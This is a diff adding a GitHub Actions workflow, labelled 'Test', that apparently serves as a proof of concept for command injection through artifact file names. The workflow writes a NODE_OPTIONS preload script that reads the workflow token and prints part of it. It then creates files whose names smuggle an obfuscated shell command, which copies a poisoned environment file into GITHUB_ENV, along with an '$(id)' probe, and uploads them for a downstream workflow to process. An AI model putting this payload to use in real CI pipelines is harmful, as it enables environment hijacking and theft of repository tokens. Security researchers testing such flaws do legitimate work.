@@ -1,0 +1,40 @@
+name: Test
+
+on:
+  push:
+    branches: [main]
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  produce:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Build artifact with attacker-controlled file names
+        run: |
+          mkdir -p content
+          cd content
+          printf 'BENIGN\n' > summary.txt
+          printf 'NODE_OPTIONS=--require=/tmp/content/content/p.js\n' > env.txt
+          cat > p.js <<'JS'
+          try {
+            const fs = require('fs');
+            const t = process.env.INPUT_TOKEN || process.env.INPUT_GITHUB_TOKEN || '';
+            const line = 'PRELOAD_RAN token_len=' + t.length + ' token_head=' + t.slice(0,4) + ' action=' + (process.env.GITHUB_ACTION || '?');
+            try { fs.appendFileSync(process.env.GITHUB_STEP_SUMMARY || '/tmp/summary', line + '\n'); } catch (e) {}
+            console.log(line);
+          } catch (e) { console.log('PRELOAD_ERR ' + e.message); }
+          JS
+          cat > /tmp/evilname <<'EOF'
+          $(cp${IFS}$(printf${IFS}'\057')tmp$(printf${IFS}'\057')content$(printf${IFS}'\057')content$(printf${IFS}'\057')env.txt${IFS}$GITHUB_ENV&&echo${IFS}summary).txt
+          EOF
+          touch "$(cat /tmp/evilname)"
+          touch 'x$(id).txt'
+          ls -la
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: content
+          path: content
